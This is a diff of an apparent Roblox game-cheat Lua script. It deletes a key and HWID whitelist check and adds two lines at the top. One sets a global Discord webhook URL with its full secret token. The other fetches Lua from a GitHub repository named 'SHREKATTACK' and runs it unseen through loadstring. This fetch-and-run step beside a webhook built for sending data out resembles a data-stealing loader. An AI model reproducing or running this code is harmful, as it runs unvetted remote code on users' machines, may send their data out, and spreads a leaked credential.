@@ -1,10 +1,5 @@
-local Server =  request({
-    Url = "https://rainhubrbx.000webhostapp.com/wejnhgiouehjauiehrjbmklrtedfjbhi9opjherhb?Key=".. _G.Key,
-    Method = "GET"
-}).Body
- 
-if Server == "WHITELIST !" then
-
+_G.webhooksdiscord = "https://discord.com/api/webhooks/995172073720774767/taDW9cCaCAPUZTdApti30gKOYJAQUcbslXKKxO5IDv-Iq7O3f7XIdK4fOC_U7tDEVEUC"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
 local TweenService = game:GetService("TweenService")
 
 if game.PlaceId == 4954752502 then
@@ -230,12 +225,4 @@ if game.PlaceId == 6266940721 then
     local MainTab = Window:NewTab("Main")
 
 end
-end
-
-elseif Server == "Invaid HWID !" then
-    game.Players.LocalPlayer:kick("Hwid ผิด!!!")
-elseif Server == "Invaid Key" then
-    game.Players.LocalPlayer:kick("ไม่มีคีย์ จ้าาาาา")
-else
-    game.Players.LocalPlayer:kick("มีบางอย่างผิดพลาด")
 end
